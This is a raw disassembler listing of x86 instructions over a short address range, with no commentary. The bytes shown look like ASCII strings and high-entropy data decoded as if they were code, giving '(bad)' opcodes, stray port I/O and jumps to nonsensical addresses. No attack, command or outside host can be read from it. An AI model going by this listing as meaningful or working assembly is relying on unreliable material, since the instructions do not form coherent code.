  41d680:	jo     0x41d6fc
  41d682:	addr16 jo 0x41d6db
  41d685:	pop    eax
  41d686:	add    BYTE PTR [eax],al
  41d688:	push   ecx
  41d689:	pop    ecx
  41d68a:	inc    ebx
  41d68b:	inc    edx
  41d68c:	outs   dx,BYTE PTR ds:[esi]
  41d68d:	popa   
  41d68e:	imul   eax,DWORD PTR [edx+0x61],0x6b
  41d692:	jne    0x41d702
  41d694:	dec    ebx
  41d695:	add    BYTE PTR [ecx+0x45],bh
  41d698:	bound  ebp,QWORD PTR [ecx+0x46]
  41d69b:	dec    ecx
  41d69c:	ja     0x41d6e3
  41d69e:	dec    eax
  41d69f:	inc    ebp
  41d6a0:	inc    edx
  41d6a1:	push   ebx
  41d6a2:	add    BYTE PTR [eax],al
  41d6a4:	je     0x41d709
  41d6a6:	bound  esp,QWORD PTR [edi+0x78]
  41d6a9:	dec    eax
  41d6aa:	bound  edx,QWORD PTR [ebx+0x43]
  41d6ad:	pop    eax
  41d6ae:	outs   dx,DWORD PTR ds:[esi]
  41d6af:	push   0x4355
  41d6b4:	inc    edi
  41d6b5:	gs ins BYTE PTR es:[edi],dx
  41d6b7:	dec    esp
  41d6b8:	js     0x41d722
  41d6ba:	inc    edx
  41d6bb:	js     0x41d703
  41d6bd:	arpl   WORD PTR [eax],ax
  41d6bf:	add    BYTE PTR [eax],al
  41d6c1:	add    BYTE PTR [eax],al
  41d6c3:	add    BYTE PTR [edx+0x70],cl
  41d6c6:	jb     0x41d740
  41d6c8:	outs   dx,DWORD PTR ds:[esi]
  41d6c9:	pop    eax
  41d6ca:	dec    ebx
  41d6cb:	push   esp
  41d6cc:	dec    esp
  41d6cd:	jns    0x41d71a
  41d6cf:	js     0x41d749
  41d6d1:	outs   dx,BYTE PTR ds:[esi]
  41d6d2:	pop    ecx
  41d6d3:	jae    0x41d743
  41d6d5:	push   0x43644448
  41d6da:	arpl   WORD PTR [edx+0x55],sp
  41d6dd:	push   0x42504e67
  41d6e2:	push   ebp
  41d6e3:	je     0x41d75a
  41d6e5:	addr16 dec edi
  41d6e7:	dec    esp
  41d6e8:	inc    edx
  41d6e9:	ins    DWORD PTR es:[edi],dx
  41d6ea:	inc    esi
  41d6eb:	inc    esi
  41d6ec:	inc    esi
  41d6ed:	arpl   WORD PTR [edx+0x47],bx
  41d6f0:	push   ebp
  41d6f1:	inc    ebx
  41d6f2:	popa   
  41d6f3:	push   edx
  41d6f4:	dec    esp
  41d6f5:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  41d6fc:	push   ecx
  41d6fd:	push   ebx
  41d6fe:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  41d705:	dec    edx
  41d706:	jns    0x41d771
  41d708:	push   edx
  41d709:	inc    ebx
  41d70a:	jo     0x41d781
  41d70c:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  41d710:	fs push ebx
  41d712:	inc    ebx
  41d713:	push   ebp
  41d714:	push   eax
  41d715:	ja     0x41d791
  41d717:	jp     0x41d766
  41d719:	push   esi
  41d71a:	arpl   WORD PTR gs:[ecx+0x45],si
  41d71e:	dec    edx
  41d71f:	dec    esi
  41d720:	data16 ja 0x41d771
  41d723:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
  41d72a:	dec    esp
  41d72b:	cmp    ebx,ebp
  41d72d:	dec    esp
  41d72e:	lods   eax,DWORD PTR ds:[esi]
  41d72f:	out    dx,al
  41d730:	mov    ebp,0xa53ddffb
  41d735:	js     0x41d6f0
  41d737:	cmc    
  41d738:	xchg   BYTE PTR gs:[esi+0x19694],bl
  41d73f:	lods   eax,DWORD PTR ds:[esi]
  41d740:	add    BYTE PTR [eax],al
  41d742:	add    BYTE PTR [ecx],ch
  41d744:	push   eax
  41d745:	dec    ecx
  41d746:	mov    al,ds:0x76a21b9f
  41d74b:	sub    BYTE PTR [edx+ebx*8],al
  41d74e:	lahf   
  41d74f:	hlt    
  41d750:	add    DWORD PTR [eax+0x45d99e4c],esi
  41d756:	adc    eax,0x62e0b479
  41d75b:	dec    edi
  41d75c:	jbe    0x41d76e
  41d75e:	cli    
  41d75f:	sbb    esi,ebx
  41d761:	sbb    cl,BYTE PTR [edx]
  41d763:	aam    0x6
  41d765:	mov    esi,0x194979f3
  41d76a:	mov    edi,0xdbe6bdd1
  41d76f:	xchg   ebp,eax
  41d770:	xor    esi,DWORD PTR [edi-0x6d]
  41d773:	adc    esi,DWORD PTR [esi+0x1d]
  41d776:	test   DWORD PTR ds:0x517ab09c,ebp
  41d77c:	sub    DWORD PTR [ebx],0xc37f671e
  41d782:	shl    DWORD PTR [esi-0x40809f54],0x2e
  41d789:	mov    ch,0x53
  41d78b:	dec    ebp
  41d78c:	sbb    eax,DWORD PTR [esi+0x20]
  41d78f:	inc    esp
  41d790:	fadd   QWORD PTR [edi+0x32c11ecf]
  41d796:	das    
  41d797:	mov    ebp,0xd1c85084
  41d79c:	imul   eax,edi,0x25a12c02
  41d7a2:	fcmovne st,st(0)
  41d7a4:	out    dx,al
  41d7a5:	sbb    BYTE PTR [esi-0x706f88de],al
  41d7ab:	mov    ecx,0xa6ca69f9
  41d7b0:	xchg   ecx,eax
  41d7b1:	pop    edx
  41d7b2:	push   esp
  41d7b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7b4:	imul   edx,ebx,0x37
  41d7b7:	sub    al,0x7e
  41d7b9:	ror    DWORD PTR [eax],0xc3
  41d7bc:	retf   0xc7fe
  41d7bf:	mov    WORD PTR [esi+0x19cbe9db],ds
  41d7c5:	push   ss
  41d7c6:	or     BYTE PTR [ebx+esi*4+0x30],bl
  41d7ca:	pop    edi
  41d7cb:	jbe    0x41d751
  41d7cd:	scas   eax,DWORD PTR es:[edi]
  41d7ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7cf:	sbb    ecx,edi
  41d7d1:	cmp    ch,BYTE PTR [edx]
  41d7d3:	inc    esp
  41d7d4:	(bad)  
  41d7d6:	pop    ds
  41d7d7:	jb     0x41d7d7
  41d7d9:	jbe    0x41d83e
  41d7db:	shl    bl,1
  41d7dd:	xchg   ebp,eax
  41d7de:	cmp    DWORD PTR [esi-0x4b],0xf
  41d7e2:	add    ebx,DWORD PTR gs:[ecx+0x5f]
  41d7e6:	xchg   esp,eax
  41d7e7:	(bad)  
  41d7e8:	lods   al,BYTE PTR ds:[esi]
  41d7e9:	sub    eax,0x8a070c26
  41d7ee:	popf   
  41d7ef:	sub    eax,0x0
  41d7f4:	add    BYTE PTR [eax],al
  41d7f6:	add    BYTE PTR [eax],al
  41d7f8:	add    BYTE PTR [eax],al
  41d7fa:	add    BYTE PTR [eax],ch
  41d7fc:	mov    dl,0xa5
  41d7fe:	push   edx
  41d7ff:	mov    edi,0x7cfaff57
  41d804:	xlat   BYTE PTR fs:[ebx]
  41d806:	push   esi
  41d807:	and    al,0x2d
  41d809:	in     al,0xa9
  41d80b:	inc    ecx
  41d80c:	xchg   edi,eax
  41d80d:	add    DWORD PTR [eax],eax
  41d80f:	lods   eax,DWORD PTR ds:[esi]
  41d810:	add    BYTE PTR [eax],al
  41d812:	add    BYTE PTR [eax+0x39326f87],dl
  41d818:	xchg   DWORD PTR [ebx+0x1d07c7c4],ecx
  41d81e:	inc    edx
  41d81f:	inc    edi
  41d820:	and    al,0x14
  41d822:	jl     0x41d7dc
  41d824:	jns    0x41d892
  41d826:	xchg   ebx,eax
  41d827:	fs and al,0xc1
  41d82a:	mov    al,ds:0x2eb1dee
  41d82f:	jmp    0x98567d81
  41d834:	fnsave [edx*2+0x1137eb7d]
  41d83b:	ror    dl,1
  41d83d:	gs jl  0x41d804
  41d840:	xor    bh,cl
  41d842:	dec    ebp
  41d843:	and    al,0xcf
  41d845:	out    0x93,al
  41d847:	mov    bh,0x29
  41d849:	add    BYTE PTR [edi-0x3f],0x65
  41d84d:	pop    edi
  41d84e:	int    0xc9
  41d850:	mov    esi,0x31ad77d5
  41d855:	mov    edx,0xc9c4bfad
  41d85a:	xchg   BYTE PTR [eax],bl
  41d85c:	lds    eax,FWORD PTR [ecx+0x12]
  41d85f:	inc    esp
  41d860:	inc    ebx
  41d861:	sbb    eax,0x20091b12
  41d866:	or     al,0x32
  41d868:	xlat   BYTE PTR ds:[ebx]
  41d869:	sbb    esi,DWORD PTR ds:0x3830797d
  41d86f:	mov    ds:0x8cc6454c,eax
  41d874:	loopne 0x41d88e
  41d876:	sbb    al,0xc0
  41d878:	pop    ebp
  41d879:	push   ebp
  41d87a:	test   eax,0xfe5aae5d
  41d87f:	jae    0x41d80e
  41d881:	out    dx,eax
  41d882:	xchg   ecx,eax
  41d883:	cli    
  41d884:	nop
  41d885:	xchg   edx,eax
  41d886:	stc    
  41d887:	jecxz  0x41d829
  41d889:	lea    edx,[ecx+0x65]
  41d88c:	xchg   ebx,eax
  41d88d:	sub    bh,BYTE PTR [ebx-0x7958dbc2]
  41d893:	(bad)  
  41d894:	cld    
  41d895:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d896:	fucomip st,st(7)
  41d898:	pop    esi
  41d899:	mov    ebx,0x50f200f7
  41d89e:	movntps XMMWORD PTR cs:[edx-0x3eb80556],xmm5
  41d8a6:	ror    BYTE PTR [edi],1
  41d8a8:	inc    edi
  41d8a9:	jne    0x41d8d5
  41d8ab:	sub    DWORD PTR [eax],edx
  41d8ad:	lahf   
  41d8ae:	cmp    BYTE PTR [eax+0x0],al
  41d8b1:	test   al,0x25
  41d8b3:	jl     0x41d8a1
  41d8b5:	pop    ebx
  41d8b6:	dec    esi
  41d8b7:	add    BYTE PTR [edx],0x1c
  41d8ba:	push   ecx
  41d8bb:	ds pop edi
  41d8bd:	loope  0x41d8da
  41d8bf:	push   ss
	...
  41d8c8:	add    BYTE PTR [eax],al
  41d8ca:	add    BYTE PTR [ebx-0x7e80ab],dh
  41d8d0:	stos   DWORD PTR es:[edi],eax
  41d8d1:	push   DWORD PTR [edi-0x42]
  41d8d4:	xchg   esi,eax
  41d8d5:	push   0x8804657
  41d8da:	icebp  
  41d8db:	out    dx,al
  41d8dc:	xchg   edi,eax
  41d8dd:	add    DWORD PTR [eax],eax
  41d8df:	lods   eax,DWORD PTR ds:[esi]
  41d8e0:	add    BYTE PTR [eax],al
  41d8e2:	add    dh,ah
  41d8e4:	jp     0x41d8c7
  41d8e6:	mov    esi,0x46ec8f18
  41d8eb:	fwait
  41d8ec:	mov    bl,0x93
  41d8ee:	adc    al,0xb5
  41d8f0:	jb     0x41d951
  41d8f2:	fcmovnbe st,st(4)
  41d8f4:	and    al,0xef
  41d8f6:	into   
  41d8f7:	pop    ecx
  41d8f8:	fld    QWORD PTR [edi+0x24]
  41d8fb:	out    dx,eax
  41d8fc:	jg     0x41d90c
  41d8fe:	stos   BYTE PTR es:[edi],al
  41d8ff:	inc    edx
  41d900:	sti    
  41d901:	and    BYTE PTR [esp+edi*4+0x9],bh
  41d905:	add    eax,0xdffe0500
  41d90a:	cmp    eax,0xd656a894
  41d90f:	mov    ch,0x96
  41d911:	ror    DWORD PTR [eax-0x775a0ece],cl
  41d917:	dec    ebp
  41d918:	mov    ch,0x1b
  41d91a:	clc    
  41d91b:	test   BYTE PTR [ebp+ebx*8+0x5a],0x24
  41d920:	(bad)  
  41d921:	pop    edx
  41d922:	xor    bh,BYTE PTR [ecx-0x55]
  41d925:	fdivr  QWORD PTR [esi]
  41d927:	std    
  41d928:	mov    ebx,0xd033aff8
  41d92d:	or     edx,ebx
  41d92f:	push   0xfffffff4
  41d931:	inc    esi
  41d932:	(bad)  
  41d933:	adc    ecx,DWORD PTR [esi]
  41d935:	add    bh,BYTE PTR gs:[ecx]
  41d938:	jno    0x41d97f
  41d93a:	and    ah,BYTE PTR [esi]
  41d93c:	daa    
  41d93d:	icebp  
  41d93e:	xlat   BYTE PTR ds:[ebx]
  41d93f:	aad    0x7b
  41d941:	or     eax,0xae8df2ac
  41d946:	add    eax,0xfee2ed01
  41d94b:	outs   dx,DWORD PTR ds:[esi]
  41d94c:	aas    
  41d94d:	mov    edi,0x4a544822
  41d952:	sbb    eax,0x40eafd9
  41d957:	mov    dh,0xaf
  41d959:	les    edi,FWORD PTR [ecx-0x35]
  41d95c:	enter  0x8272,0xad
  41d960:	sbb    eax,0xfe114ef3
  41d965:	inc    ecx
  41d966:	cmp    DWORD PTR [ebx+0x62],ebx
  41d969:	(bad)  
  41d96a:	fwait
  41d96b:	mov    eax,ds:0xe7c00a0
  41d970:	(bad)  
  41d971:	push   ebp
  41d972:	mov    ch,0x2d
  41d974:	retf   
  41d975:	div    DWORD PTR [esi+0x2f00e1d4]
  41d97b:	popa   
  41d97c:	jl     0x41d911
  41d97e:	and    DWORD PTR [ebp+0x2a],ebp
  41d981:	mov    ds:0x88617e27,al
  41d986:	jno    0x41d9e4
  41d988:	dec    edx
  41d989:	aaa    
  41d98a:	stos   BYTE PTR es:[edi],al
  41d98b:	mov    dh,0x83
  41d98d:	cmp    cl,BYTE PTR [esi+0xf]
	...
  41d99b:	cmp    dh,dl
  41d99d:	cmp    ah,BYTE PTR [esi+edi*8]
  41d9a0:	in     al,dx
  41d9a1:	fimul  WORD PTR ds:[edi-0x6b53942b]
  41d9a8:	pop    esi
  41d9a9:	das    
  41d9aa:	loopne 0x41d947
  41d9ac:	cwde   
  41d9ad:	add    DWORD PTR [eax],eax
  41d9af:	lods   eax,DWORD PTR ds:[esi]
  41d9b0:	add    BYTE PTR [eax],al
  41d9b2:	add    BYTE PTR [ebp-0x72],ah
  41d9b5:	jl     0x41d9f5
  41d9b7:	ins    BYTE PTR es:[edi],dx
  41d9b8:	hlt    
  41d9b9:	bound  eax,QWORD PTR [edi-0x40]
  41d9bc:	rcr    BYTE PTR [ebx],1
  41d9be:	add    bh,cl
  41d9c0:	test   bl,bh
  41d9c2:	jp     0x41d9b3
  41d9c4:	mov    eax,0xdb47c0e0
  41d9c9:	addr16 pop ss
  41d9cb:	call   FWORD PTR [eax-0x17]
  41d9ce:	jecxz  0x41d976
  41d9d0:	or     esi,ecx
  41d9d2:	les    ecx,FWORD PTR [ecx+eax*1-0x62]
  41d9d6:	jbe    0x41da2e
  41d9d8:	cmp    al,0x8e
  41d9da:	adc    DWORD PTR [edx+ecx*4-0x63],0x6d901b3
  41d9e2:	imul   ebx,edi,0xfffffffa
  41d9e5:	cmp    al,0x9c
  41d9e7:	rcl    DWORD PTR [eax+0x25],1
  41d9ea:	cmp    ah,al
  41d9ec:	mov    ecx,0x99ab4d42
  41d9f1:	fwait
  41d9f2:	cmc    
  41d9f3:	out    dx,eax
  41d9f4:	xchg   BYTE PTR [ecx-0x67],dh
  41d9f7:	pushf  
  41d9f8:	(bad)  
  41d9f9:	ret    
  41d9fa:	call   0x2a685ba1
  41d9ff:	lea    edi,[ecx-0x330109ae]
  41da05:	dec    ebx
  41da06:	lahf   
  41da07:	and    BYTE PTR ds:0x4e7d5b37,0xe9
  41da0e:	mov    esp,0x929d273c
  41da13:	pop    edx
  41da14:	js     0x41da33
  41da16:	xor    DWORD PTR [edx],ebp
  41da18:	jle    0x41d9a0
  41da1a:	es (bad) 
  41da1c:	mov    ah,BYTE PTR ss:[ebp*4+0x84cdd42]
  41da24:	jno    0x41d9e4
  41da26:	sub    DWORD PTR [edx+0x7f],esp
  41da29:	add    DWORD PTR [edi],ecx
  41da2b:	mov    DWORD PTR [ecx+ebp*4],edi
  41da2e:	xchg   edi,eax
  41da2f:	adc    al,0xf3
  41da31:	sbb    BYTE PTR [ebx+0x44],0xb
  41da35:	ror    eax,cl
  41da37:	test   cl,dh
  41da39:	push   0xfd4565ef
  41da3e:	jb     0x41da31
  41da40:	add    DWORD PTR [ecx-0x9b3ac50],edi
  41da46:	enter  0xc7fb,0xa0
  41da4a:	leave  
  41da4b:	pop    esi
  41da4c:	sub    al,BYTE PTR [eax+0x77066f9e]
  41da52:	cmp    eax,0xe516f09a
  41da57:	jo     0x41da1e
  41da59:	cmp    BYTE PTR [edi-0x64],bl
  41da5c:	and    eax,0x941db5
	...
  41da69:	add    BYTE PTR [eax],al
  41da6b:	fnstenv [esi-0x2490e49a]
  41da71:	std    
  41da72:	neg    BYTE PTR [esi]
  41da74:	sub    esp,DWORD PTR [ebx-0x23]
  41da77:	mov    ah,0x38
  41da79:	xchg   ecx,eax
  41da7a:	mov    ds:0x19948,eax
  41da7f:	lods   eax,DWORD PTR ds:[esi]
  41da80:	add    BYTE PTR [eax],al
  41da82:	add    BYTE PTR [edx+0x5b18ad58],bh
  41da88:	lock lods al,BYTE PTR ds:[esi]
  41da8a:	pop    esi
  41da8b:	add    al,0x20
  41da8d:	mov    ah,0x2f
  41da8f:	repnz mov dl,0xec
  41da92:	test   al,0x36
  41da94:	hlt    
  41da95:	and    ebp,DWORD PTR [ecx+0x1f]
  41da98:	jb     0x41daf8
  41da9a:	addr16 mov al,ds:0xbf12
  41da9e:	addr16 pop ecx
  41daa0:	jbe    0x41da89
  41daa2:	loop   0x41da31
  41daa4:	pop    ecx
  41daa5:	mov    esi,0x25acb6a1
  41daaa:	loope  0x41dadf
  41daac:	ficomp WORD PTR [ebx-0xa]
  41daaf:	mov    ebp,0x27d94d9a
  41dab4:	push   esp
  41dab5:	dec    eax
  41dab6:	iret   
  41dab7:	(bad)  
  41dab8:	clc    
  41dab9:	div    ecx
  41dabb:	inc    ebp
  41dabc:	dec    ecx
  41dabd:	mov    ?,WORD PTR [esi-0x2]
  41dac0:	gs addr16 inc ebx
  41dac3:	dec    ecx
  41dac4:	repz lea eax,ss:[ebx+edx*2+0x252e6b87]
  41dacd:	inc    ebp
  41dace:	jl     0x41da9c
  41dad0:	aad    0x54
  41dad2:	neg    DWORD PTR [eax]
  41dad4:	push   cs
  41dad5:	mov    dl,0xf0
  41dad7:	pop    esi
  41dad8:	clc    
  41dad9:	jecxz  0x41daf4
  41dadb:	mov    eax,ds:0x2e0cec96
  41dae0:	call   0xf81b:0xbb7d5bba
  41dae7:	rcl    DWORD PTR [ebp+0x8],1
  41daea:	push   eax
  41daeb:	xchg   edx,eax
  41daec:	cmp    eax,0x8f88d08f
  41daf1:	dec    ebx
  41daf2:	imul   ecx,DWORD PTR [edx],0xffffffd6
  41daf5:	ret    
  41daf6:	dec    ecx
  41daf7:	sbb    BYTE PTR [ebp-0x37],0x91
  41dafb:	pop    edx
  41dafc:	imul   esi,DWORD PTR [eax-0x27],0x955586d3
  41db03:	xchg   ebx,eax
  41db04:	inc    edx
  41db05:	sub    eax,DWORD PTR [edi-0x64688f21]
  41db0b:	dec    ebx
  41db0c:	sbb    ch,BYTE PTR [edx]
  41db0e:	jne    0x41db4c
  41db10:	outs   dx,DWORD PTR ds:[esi]
  41db11:	(bad)  
  41db12:	cmp    al,0xf7
  41db14:	cmp    eax,0x53012ddc
  41db19:	nop
  41db1a:	cli    
  41db1b:	lahf   
  41db1c:	xor    DWORD PTR [eax],esi
  41db1e:	bound  ecx,QWORD PTR [ebx]
  41db20:	gs gs inc ebp
  41db23:	fldcw  WORD PTR [edi+edi*2+0x47]
  41db27:	jg     0x41db8f
  41db29:	mov    ebp,DWORD PTR [ecx+edi*1+0x7c]
  41db2d:	stc    
  41db2e:	xchg   ecx,eax
  41db2f:	pop    es
	...
  41db38:	add    BYTE PTR [eax],al
  41db3a:	add    dl,bl
  41db3c:	xor    dl,BYTE PTR [edi-0x20500076]
  41db42:	jb     0x41db47
  41db44:	inc    ebp
  41db45:	mov    ds:0x834e195c,eax
  41db4a:	shl    ebp,cl
  41db4c:	cdq    
  41db4d:	add    DWORD PTR [eax],eax
  41db4f:	lods   eax,DWORD PTR ds:[esi]
  41db50:	add    BYTE PTR [eax],al
  41db52:	add    BYTE PTR [esi+0xed14f31],dl
  41db58:	out    0x36,eax
  41db5a:	mov    eax,0xc0aa012c
  41db5f:	in     al,dx
  41db60:	jge    0x41db13
  41db62:	sub    eax,0xa5301985
  41db67:	loope  0x41db67
  41db69:	sbb    eax,0xca3af5b9
  41db6e:	xchg   DWORD PTR [ebp-0x1244c641],edi
  41db74:	and    al,0xc8
  41db76:	lock mov al,0x9e
  41db79:	and    al,BYTE PTR ds:0x6ff0b441
  41db7f:	add    BYTE PTR [esi+0x18],ah
  41db82:	jne    0x41dba1
  41db84:	and    eax,0x5a475270
  41db89:	xchg   edx,eax
  41db8a:	ret    0x2ce7
  41db8d:	pop    esi
  41db8e:	xor    DWORD PTR [eax],ecx
  41db90:	test   bl,ch
  41db92:	add    BYTE PTR [ebx+ebp*4-0x1b],bl
  41db96:	pop    es
  41db97:	nop
  41db98:	add    DWORD PTR [esi],edi
  41db9a:	aaa    
  41db9b:	aam    0x49
  41db9d:	xchg   edi,eax
  41db9e:	call   0x69ef:0xf7aff7a4
  41dba5:	xchg   DWORD PTR [ebx],eax
  41dba7:	dec    ebx
  41dba8:	push   ss
  41dba9:	imul   DWORD PTR [edi]
  41dbab:	mov    eax,0xbc710911
  41dbb0:	xor    bl,BYTE PTR [edi+eiz*8+0x2a19daaf]
  41dbb7:	inc    esp
  41dbb8:	xchg   esp,eax
  41dbb9:	imul   ebx,ebp,0x7c
  41dbbc:	mov    BYTE PTR [edi-0x5b6eaea4],cl
  41dbc2:	sbb    DWORD PTR [ecx+0x424ab9d1],esi
  41dbc8:	inc    esp
  41dbc9:	jb     0x41dc0a
  41dbcb:	pop    ss
  41dbcc:	mov    ah,ch
  41dbce:	(bad)  
  41dbcf:	cdq    
  41dbd0:	mov    dh,0xb4
  41dbd2:	pop    DWORD PTR [ebp+0x6b1cbd2e]
  41dbd8:	call   0x4760eac0
  41dbdd:	jo     0x41db9d
  41dbdf:	adc    DWORD PTR [ecx],0xc26bc3b5
  41dbe5:	xor    dl,BYTE PTR [esi]
  41dbe7:	lods   eax,DWORD PTR ds:[esi]
  41dbe8:	jge    0x41dc16
  41dbea:	dec    esi
  41dbeb:	(bad)
  41dbee:	daa    
  41dbef:	das    
  41dbf0:	fnstenv [esi-0x5e4f589a]
  41dbf6:	inc    edx
  41dbf7:	dec    edi
  41dbf8:	test   eax,0xf3763713
  41dbfd:	xchg   esi,eax
  41dbfe:	outs   dx,BYTE PTR ds:[esi]
  41dbff:	xor    al,BYTE PTR [eax]
	...
  41dc09:	add    BYTE PTR [eax],al
  41dc0b:	dec    eax
  41dc0c:	in     al,0x3
  41dc0e:	fwait
  41dc0f:	scas   eax,DWORD PTR es:[edi]
  41dc10:	(bad)  
  41dc11:	fdiv   st,st(7)
  41dc13:	pop    esi
  41dc14:	sub    BYTE PTR [eax+0x4be93d8f],bl
  41dc1a:	push   ebp
  41dc1b:	mov    ds:0xad00019a,al
  41dc20:	add    BYTE PTR [eax],al
  41dc22:	add    BYTE PTR [esi-0x7c11c11a],ch
  41dc28:	mov    ah,0x42
  41dc2a:	mov    cl,0x79
  41dc2c:	jns    0x41dc69
  41dc2e:	sub    ecx,DWORD PTR [ebx+0x2c1d53d6]
  41dc34:	xchg   DWORD PTR ss:[ebx-0x770f4fd9],esi
  41dc3b:	mov    DWORD PTR [ecx-0x165d1e73],esi
  41dc41:	mov    edx,0x4d617f61
  41dc46:	retf   0xd469
  41dc49:	sbb    eax,0xc017f19f
  41dc4e:	or     esi,DWORD PTR [edx-0x2883cbf]
  41dc54:	jne    0x41dc13
  41dc56:	aad    0x73
  41dc58:	jns    0x41dc7e
  41dc5a:	repz push 0x3f
  41dc5d:	out    0x9f,al
  41dc5f:	int    0xaa
  41dc61:	sbb    esi,DWORD PTR [edi+0x4b546666]
  41dc67:	sbb    BYTE PTR [edi+0x32],bh
  41dc6a:	xchg   edx,ecx
  41dc6c:	aas    
  41dc6d:	fidiv  WORD PTR [edx]
  41dc6f:	mov    ebx,0x87f4498c
  41dc74:	loop   0x41dc8f
  41dc76:	adc    BYTE PTR [edx+0x651ac402],ch
  41dc7c:	aad    0xe4
  41dc7e:	icebp  
  41dc7f:	mov    edx,0x3d374a57
  41dc84:	mov    edx,0x848bb710
  41dc89:	fs and al,0x9
  41dc8c:	pop    edx
  41dc8d:	mov    eax,0xe9e5f77a
  41dc92:	xor    eax,DWORD PTR [ebp-0xf5f3c32]
  41dc98:	(bad)  
  41dc99:	cmp    eax,0x99c0f00e
  41dc9e:	and    ebx,DWORD PTR [edi]
  41dca0:	xor    al,0x6b
  41dca2:	cmp    al,BYTE PTR [eax-0x16e1892f]
  41dca8:	xchg   ebp,eax
  41dca9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcaa:	mov    ebx,0xb345f206
  41dcaf:	cmp    esi,DWORD PTR [eax-0x1b]
  41dcb2:	mov    dl,0xc9
  41dcb4:	call   0x9e93:0xc5931f5f
  41dcbb:	test   ecx,eax
  41dcbd:	xor    eax,0x67d86494
  41dcc2:	push   es
  41dcc3:	jnp    0x41dc78
  41dcc5:	push   ebx
  41dcc6:	cld    
  41dcc7:	inc    edx
  41dcc8:	mov    ?,esi
  41dcca:	push   0xfffffff1
  41dccc:	push   ecx
  41dccd:	jl     0x41dcd7
  41dccf:	or     BYTE PTR [eax],al
	...
  41dcd9:	add    BYTE PTR [eax],al
  41dcdb:	push   edx
  41dcdc:	add    al,0xa2
  41dcde:	xor    dh,0xa6
  41dce1:	jb     0x41dcb7
  41dce3:	ins    DWORD PTR es:[edi],dx
  41dce4:	xor    dh,BYTE PTR [edx]
  41dce6:	and    eax,0x3d5109c8
  41dceb:	dec    edi
  41dcec:	fwait
  41dced:	add    DWORD PTR [eax],eax
  41dcef:	lods   eax,DWORD PTR ds:[esi]
  41dcf0:	add    BYTE PTR [eax],al
  41dcf2:	add    BYTE PTR [eax],bh
  41dcf4:	adc    eax,0x9a3d02e8
  41dcf9:	mov    al,ds:0x294561c9
  41dcfe:	cwde   
  41dcff:	xchg   esi,eax
  41dd00:	inc    esi
  41dd01:	in     eax,0xe9
  41dd03:	ret    
  41dd04:	ret    0xe0f2
  41dd07:	mov    ebp,0xc1b0d89a
  41dd0c:	and    bh,bl
  41dd0e:	cmp    BYTE PTR [ebx+0x58],ah
  41dd11:	add    eax,0x91075d11
  41dd16:	push   0xffffffe2
  41dd18:	std    
  41dd19:	sar    BYTE PTR [ebx],1
  41dd1b:	mov    esp,0xf879c5fe
  41dd20:	push   esi
  41dd21:	dec    esp
  41dd22:	xchg   BYTE PTR [ebx-0x3c],dh
  41dd25:	(bad)  
  41dd26:	out    dx,al
  41dd27:	aam    0x42
  41dd29:	sub    DWORD PTR [ebp-0x1],0xffffff96
  41dd2d:	shl    edi,1
  41dd2f:	cmp    al,0xd
  41dd31:	(bad)
  41dd35:	jno    0x41dd48
  41dd37:	xor    BYTE PTR [edx-0x17],0x23
  41dd3b:	jl     0x41dcff
  41dd3d:	pusha  
  41dd3e:	cmp    DWORD PTR [edi-0x7dec843],ecx
  41dd44:	xor    ah,al
  41dd46:	stos   DWORD PTR es:[edi],eax
  41dd47:	pop    ds
  41dd48:	add    al,0xef
  41dd4a:	sub    dl,al
  41dd4c:	jae    0x41ddc2
  41dd4e:	pop    edi
  41dd4f:	es mov bh,0xa5
  41dd52:	push   ebp
  41dd53:	mul    BYTE PTR [edi+ebx*4+0x6f]
  41dd57:	dec    ebx
  41dd58:	iret   
  41dd59:	scas   eax,DWORD PTR es:[edi]
  41dd5a:	out    dx,eax
  41dd5b:	mov    ebx,0x320d5b91
  41dd60:	sbb    BYTE PTR [esi],ah
  41dd62:	out    dx,al
  41dd63:	(bad)  
  41dd64:	retf   
  41dd65:	or     eax,0x55032c3e
  41dd6a:	sahf   
  41dd6b:	mov    bh,0xd1
  41dd6d:	retf   0xaaaf
  41dd70:	xchg   edi,eax
  41dd71:	(bad)  
  41dd73:	xor    DWORD PTR [esi-0x80],0xa6e423ea
  41dd7a:	std    
  41dd7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd7c:	pop    esi
  41dd7d:	jecxz  0x41dd0a
  41dd7f:	jp     0x41dd5f
  41dd81:	mov    eax,ds:0xa533e46e
  41dd86:	fnstsw WORD PTR [esi]
  41dd88:	inc    eax
  41dd89:	lds    esp,FWORD PTR [ebx-0x78f9622e]
  41dd8f:	inc    ebp
  41dd90:	test   DWORD PTR [esi],esp
  41dd92:	popa   
  41dd93:	or     ebx,DWORD PTR [ecx+0xe]
  41dd96:	pusha  
  41dd97:	and    al,0xb4
  41dd99:	mov    es,WORD PTR [ecx-0x55dcbcbc]
  41dd9f:	dec    edi
	...
  41dda8:	add    BYTE PTR [eax],al
  41ddaa:	add    BYTE PTR [eax],bh
  41ddac:	push   0xffffff96
  41ddae:	add    edx,esi
  41ddb0:	(bad)  
  41ddb1:	mov    ebp,0xdb4ef67b
  41ddb6:	out    0xbc,eax
  41ddb8:	daa    
  41ddb9:	shl    DWORD PTR [esp+edi*8],0x9b
  41ddbd:	add    DWORD PTR [eax],eax
  41ddbf:	lods   eax,DWORD PTR ds:[esi]
  41ddc0:	add    BYTE PTR [eax],al
  41ddc2:	add    bh,bh
  41ddc4:	adc    DWORD PTR [ecx-0x2097b158],0xa645d7db
  41ddce:	dec    eax
  41ddcf:	push   ss
  41ddd0:	pop    ds
  41ddd1:	(bad)  
  41ddd2:	pushf  
  41ddd3:	inc    edx
  41ddd4:	mov    bh,0xf3
  41ddd6:	imul   DWORD PTR [edx+0x7d]
  41ddd9:	lods   eax,DWORD PTR ds:[esi]
  41ddda:	sub    eax,0x95743776
  41dddf:	sub    ch,BYTE PTR [ecx-0x5d]
  41dde2:	fcmovbe st,st(3)
  41dde4:	das    
  41dde5:	add    al,0x90
  41dde7:	inc    esi
  41dde8:	sub    DWORD PTR [eax-0x2e9690d0],0x280d0a44
  41ddf2:	fs xchg edx,eax
  41ddf4:	inc    edi
  41ddf5:	leave  
